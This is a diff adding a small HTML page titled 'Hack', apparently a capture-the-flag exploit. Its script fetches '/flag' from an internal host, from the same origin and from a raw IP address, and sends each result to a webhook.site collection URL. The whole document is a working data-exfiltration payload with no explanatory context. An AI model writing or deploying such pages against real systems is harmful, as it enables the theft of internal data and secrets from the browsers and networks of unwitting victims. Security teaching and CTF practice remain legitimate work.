@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack</title>
+</head>
+<body>
+    <script>
+        var result = await fetch("http://web:8001/flag");
+        var flag = await result.text();
+        fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag1="+flag);
+        result = await fetch("/flag");
+        flag = await result.text();
+        fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag2="+flag);
+        result = await fetch("http://91.107.157.58:8001/flag");
+        flag = await result.text();
+        fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag3="+flag);
+    </script>
+</body>
+</html>
